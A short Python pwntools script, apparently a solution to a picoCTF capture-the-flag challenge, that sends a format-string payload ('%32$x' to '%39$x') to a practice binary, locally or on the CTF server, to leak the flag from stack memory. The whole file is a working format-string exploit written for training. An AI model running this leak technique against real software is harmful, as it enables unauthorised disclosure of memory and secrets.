#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("vuln")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("saturn.picoctf.net", 65427)
    else:
        return process(elf.path)

io = start()

# input differnt places to find full flag
payload = b""
for i in range(32, 40):
    payload += "%{}$x,".format(i).encode()
io.sendlineafter(b"Tell me a story and then I'll tell you one >> ", payload)

io.interactive()
